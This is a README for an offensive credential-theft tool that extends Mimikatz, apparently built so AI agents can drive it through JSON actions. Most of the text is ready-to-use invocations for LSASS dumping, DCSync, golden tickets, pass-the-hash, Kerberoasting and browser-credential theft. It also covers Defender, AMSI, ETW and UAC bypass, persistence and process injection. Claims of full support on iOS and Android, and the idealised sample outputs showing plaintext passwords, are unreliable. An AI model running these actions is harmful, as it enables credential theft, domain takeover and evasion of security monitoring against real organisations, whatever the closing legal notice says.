# Mimikatz Enhanced Tool

## Overview
The **Mimikatz Enhanced Tool** is an enhanced Mimikatz credential extraction and manipulation tool with full cross-platform support. It provides comprehensive credential harvesting capabilities including LSASS memory dumping, credential extraction, ticket manipulation, privilege escalation techniques, and advanced evasion methods.

## Features
- **Credential Extraction**: Extract credentials from LSASS memory
- **LSASS Dumping**: Dump LSASS memory for offline analysis
- **Ticket Manipulation**: Golden and silver ticket creation
- **Pass-the-Hash**: Pass-the-hash attack capabilities
- **Pass-the-Key**: Pass-the-key attack capabilities
- **Over Pass-the-Hash**: Over pass-the-hash attack capabilities
- **Pass-the-Cert**: Pass-the-cert attack capabilities
- **Kerberoasting**: Kerberoasting attack capabilities
- **ASREPRoasting**: ASREPRoasting attack capabilities
- **S4U Attack**: S4U attack capabilities
- **Unconstrained Delegation**: Unconstrained delegation attack
- **DCSync**: DCSync attack for domain controller synchronization
- **Cross-Platform**: Windows, Linux, macOS, Android, iOS support
- **Natural Language**: Conversational interface for credential operations

## Usage

### Credential Extraction
```bash
# Extract credentials
{
  "action": "extract_credentials",
  "target_user": "user@domain.com",
  "target_domain": "domain.com"
}

# Dump LSASS memory
{
  "action": "dump_lsass",
  "output_file": "/path/to/lsass.dmp"
}

# Extract master keys
{
  "action": "extract_masterkeys",
  "target_user": "user@domain.com"
}

# Extract hashes
{
  "action": "extract_hashes",
  "target_user": "user@domain.com"
}

# Extract passwords
{
  "action": "extract_passwords",
  "target_user": "user@domain.com"
}

# Extract tokens
{
  "action": "extract_tokens",
  "target_user": "user@domain.com"
}

# Extract certificates
{
  "action": "extract_certificates",
  "target_user": "user@domain.com"
}
```

### Ticket Manipulation
```bash
# Extract tickets
{
  "action": "extract_tickets",
  "ticket_file": "/path/to/tickets.kirbi"
}

# Create golden ticket
{
  "action": "golden_ticket",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "target_dc": "dc.domain.com"
}

# Create silver ticket
{
  "action": "silver_ticket",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "service_name": "cifs/server.domain.com"
}

# Export tickets
{
  "action": "ticket_export",
  "ticket_file": "/path/to/tickets.kirbi",
  "ticket_format": "kirbi"
}

# Import tickets
{
  "action": "ticket_import",
  "ticket_file": "/path/to/tickets.kirbi",
  "ticket_format": "kirbi"
}

# Purge tickets
{
  "action": "ticket_purge",
  "target_user": "user@domain.com"
}

# List tickets
{
  "action": "ticket_list",
  "target_user": "user@domain.com"
}

# Use ticket
{
  "action": "ticket_use",
  "ticket_file": "/path/to/ticket.kirbi"
}

# Renew ticket
{
  "action": "ticket_renew",
  "ticket_file": "/path/to/ticket.kirbi"
}

# Convert ticket
{
  "action": "ticket_convert",
  "ticket_file": "/path/to/ticket.kirbi",
  "ticket_format": "ccache"
}
```

### Pass-the-Hash
```bash
# Pass-the-hash attack
{
  "action": "pass_the_hash",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "hash_value": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99"
}

# Pass-the-key attack
{
  "action": "pass_the_key",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "key_value": "key_value_here"
}

# Over pass-the-hash attack
{
  "action": "over_pass_the_hash",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "hash_value": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99"
}

# Pass-the-cert attack
{
  "action": "pass_the_cert",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "certificate": "certificate_data_here"
}
```

### Kerberoasting
```bash
# Kerberoasting attack
{
  "action": "kerberoast",
  "target_domain": "domain.com"
}

# ASREPRoasting attack
{
  "action": "asreproast",
  "target_domain": "domain.com"
}

# S4U attack
{
  "action": "s4u_attack",
  "target_user": "user@domain.com",
  "target_domain": "domain.com"
}

# Unconstrained delegation attack
{
  "action": "unconstrained_delegation",
  "target_domain": "domain.com"
}
```

### DCSync
```bash
# DCSync attack
{
  "action": "dcsync",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "target_dc": "dc.domain.com"
}

# DCSync forest
{
  "action": "dcsync_forest",
  "target_domain": "domain.com"
}

# DCSync user
{
  "action": "dcsync_user",
  "target_user": "user@domain.com",
  "target_domain": "domain.com"
}

# DCSync group
{
  "action": "dcsync_group",
  "target_group": "Domain Admins",
  "target_domain": "domain.com"
}

# DCSync computer
{
  "action": "dcsync_computer",
  "target_computer": "computer.domain.com",
  "target_domain": "domain.com"
}
```

### LSA Dumping
```bash
# LSA dump
{
  "action": "lsa_dump",
  "target_user": "user@domain.com"
}

# SAM dump
{
  "action": "sam_dump",
  "target_user": "user@domain.com"
}

# NTDS dump
{
  "action": "ntds_dump",
  "target_domain": "domain.com"
}
```

### Domain Information
```bash
# Domain info
{
  "action": "domain_info",
  "target_domain": "domain.com"
}

# Trust info
{
  "action": "trust_info",
  "target_domain": "domain.com"
}
```

### DPAPI Operations
```bash
# DPAPI decrypt
{
  "action": "dpapi_decrypt",
  "target_user": "user@domain.com"
}

# DPAPI master key
{
  "action": "dpapi_masterkey",
  "target_user": "user@domain.com"
}

# DPAPI credential
{
  "action": "dpapi_credential",
  "target_user": "user@domain.com"
}

# DPAPI vault
{
  "action": "dpapi_vault",
  "target_user": "user@domain.com"
}

# DPAPI Chrome
{
  "action": "dpapi_chrome",
  "target_user": "user@domain.com"
}

# DPAPI Edge
{
  "action": "dpapi_edge",
  "target_user": "user@domain.com"
}

# DPAPI Firefox
{
  "action": "dpapi_firefox",
  "target_user": "user@domain.com"
}

# DPAPI Safari
{
  "action": "dpapi_safari",
  "target_user": "user@domain.com"
}
```

### Memory Patching
```bash
# Memory patch
{
  "action": "memory_patch",
  "target_process": "lsass.exe"
}

# ETW patch
{
  "action": "etw_patch",
  "target_process": "lsass.exe"
}

# AMSI bypass
{
  "action": "amsi_bypass",
  "target_process": "powershell.exe"
}

# Defender bypass
{
  "action": "defender_bypass",
  "target_process": "powershell.exe"
}

# UAC bypass
{
  "action": "uac_bypass",
  "target_process": "powershell.exe"
}
```

### Token Operations
```bash
# Token impersonation
{
  "action": "token_impersonation",
  "target_user": "user@domain.com"
}

# Privilege escalation
{
  "action": "privilege_escalation",
  "target_user": "user@domain.com"
}
```

### Persistence
```bash
# Establish persistence
{
  "action": "persistence",
  "target_user": "user@domain.com",
  "persistence_method": "registry"
}
```

### Platform-Specific Operations
```bash
# iOS keychain
{
  "action": "ios_keychain",
  "target_user": "user@domain.com"
}

# Android keystore
{
  "action": "android_keystore",
  "target_user": "user@domain.com"
}

# macOS keychain
{
  "action": "macos_keychain",
  "target_user": "user@domain.com"
}

# Linux keyring
{
  "action": "linux_keyring",
  "target_user": "user@domain.com"
}

# Windows credential manager
{
  "action": "windows_credential_manager",
  "target_user": "user@domain.com"
}
```

### Browser Credentials
```bash
# Browser credentials
{
  "action": "browser_credentials",
  "target_user": "user@domain.com"
}

# WiFi credentials
{
  "action": "wifi_credentials",
  "target_user": "user@domain.com"
}
```

### Process Operations
```bash
# Process hollowing
{
  "action": "process_hollowing",
  "target_process": "notepad.exe"
}

# DLL injection
{
  "action": "dll_injection",
  "target_process": "notepad.exe"
}

# Process injection
{
  "action": "process_injection",
  "target_process": "notepad.exe"
}

# Reflective DLL
{
  "action": "reflective_dll",
  "target_process": "notepad.exe"
}
```

### Evasion Techniques
```bash
# Unhook
{
  "action": "unhook",
  "target_process": "powershell.exe"
}

# Patch ETW
{
  "action": "patch_etw",
  "target_process": "powershell.exe"
}

# Patch AMSI
{
  "action": "patch_amsi",
  "target_process": "powershell.exe"
}

# Disable Defender
{
  "action": "disable_defender",
  "target_process": "powershell.exe"
}
```

### Custom Operations
```bash
# Custom command
{
  "action": "custom_command",
  "custom_command": "sekurlsa::logonpasswords"
}

# Script execution
{
  "action": "script_execution",
  "script_content": "sekurlsa::logonpasswords"
}

# Module load
{
  "action": "module_load",
  "module_name": "mimikatz.dll"
}

# Plugin execute
{
  "action": "plugin_execute",
  "plugin_name": "sekurlsa"
}
```

## Parameters

### Target Parameters
- **target_user**: Target user for operations
- **target_domain**: Target domain
- **target_dc**: Target domain controller
- **target_computer**: Target computer
- **target_process**: Target process name or PID

### Authentication Parameters
- **username**: Username for authentication
- **password**: Password for authentication
- **hash_value**: Hash value (NTLM, LM, etc.)
- **key_value**: Key value for pass-the-key
- **certificate**: Certificate for pass-the-cert

### File Parameters
- **ticket_file**: Ticket file path
- **ticket_format**: Ticket format (kirbi, ccache, tgt, st)
- **input_file**: Input file path
- **output_file**: Output file path
- **dump_file**: Memory dump file path

### Service Parameters
- **service_name**: Service name for silver tickets

### Injection Parameters
- **injection_method**: Process injection method
- **evasion_technique**: Evasion technique
- **persistence_method**: Persistence method

### Platform Parameters
- **platform**: Target platform
- **architecture**: Target architecture

### Safety Parameters
- **safe_mode**: Enable safe mode to prevent actual operations
- **stealth_mode**: Enable stealth mode for evasion
- **verbose**: Enable verbose output
- **debug**: Enable debug output

## Output Format
```json
{
  "success": true,
  "action": "extract_credentials",
  "result": {
    "credentials": [
      {
        "username": "user@domain.com",
        "domain": "domain.com",
        "password": "password123",
        "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99",
        "lm_hash": "aad3b435b51404eeaad3b435b51404ee",
        "source": "lsass"
      }
    ],
    "total_credentials": 1,
    "extraction_time": "00:00:05"
  }
}
```

## Cross-Platform Support
- **Windows**: Full support with native integration
- **Linux**: Complete functionality
- **macOS**: Full feature support
- **Android**: Mobile-optimized interface
- **iOS**: Native iOS integration

## Examples

### Example 1: Enhanced Credential Extraction
```bash
# Extract credentials with enhanced features
{
  "action": "extract_credentials",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "stealth_mode": true
}

# Result
{
  "success": true,
  "result": {
    "credentials": [
      {
        "username": "user@domain.com",
        "password": "password123",
        "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99"
      }
    ],
    "stealth_mode": true,
    "evasion_techniques": ["unhook", "patch_etw"]
  }
}
```

### Example 2: Advanced Ticket Manipulation
```bash
# Create golden ticket with enhanced features
{
  "action": "golden_ticket",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "target_dc": "dc.domain.com",
  "ticket_format": "kirbi"
}

# Result
{
  "success": true,
  "result": {
    "ticket": "golden_ticket.kirbi",
    "target_user": "user@domain.com",
    "target_domain": "domain.com",
    "validity": "10 years",
    "format": "kirbi"
  }
}
```

## Error Handling
- **Authentication Errors**: Proper handling of authentication failures
- **Permission Errors**: Secure handling of permission issues
- **File Errors**: Robust error handling for file operations
- **Memory Errors**: Safe handling of memory access issues
- **Evasion Errors**: Secure handling of evasion technique failures

## Related Tools
- **Post-Exploitation**: Other post-exploitation tools
- **Credential Management**: Credential management tools
- **Active Directory**: Active Directory security tools

## Version
- **Current Version**: 1.0.0
- **Last Updated**: September 2025
- **Compatibility**: MCP God Mode v1.9+

## Support
For issues or questions about the Mimikatz Enhanced Tool, please refer to the main MCP God Mode documentation or contact the development team.

## Legal Notice
This tool is designed for authorized security testing and research only. Users must ensure they have proper authorization before using any Mimikatz capabilities. Unauthorized use may violate laws and regulations.
